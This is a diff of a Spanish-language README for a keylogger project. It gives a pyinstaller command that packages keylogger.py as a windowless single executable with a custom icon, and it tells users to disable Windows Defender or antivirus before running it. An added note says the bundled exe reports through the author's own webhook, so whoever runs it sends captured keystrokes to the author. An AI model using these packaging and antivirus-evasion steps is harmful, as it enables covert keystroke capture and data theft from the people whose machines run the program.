@@ -64,9 +64,12 @@ Por si desea un icono custom para el exe.
 pyinstaller keylogger.py --onefile --noconsole --icon=ejemplo.ico
 ```
 
-(Es necesario desactivar el windows defender/antivirus para probrar el programa)
-
 # Instalador
 
 Si se desea crear un instalador para el programa podemos seguir [este](https://www.youtube.com/watch?v=cVN62zhiNH0&t=519s) tutorial
+
+
+# Notas
+- (Es necesario desactivar el windows defender/antivirus para probrar el programa)
+- (El exe incluido en este repositorio posee un webhook propio por lo que si lo ejecutan yo recibire los reportes)
 
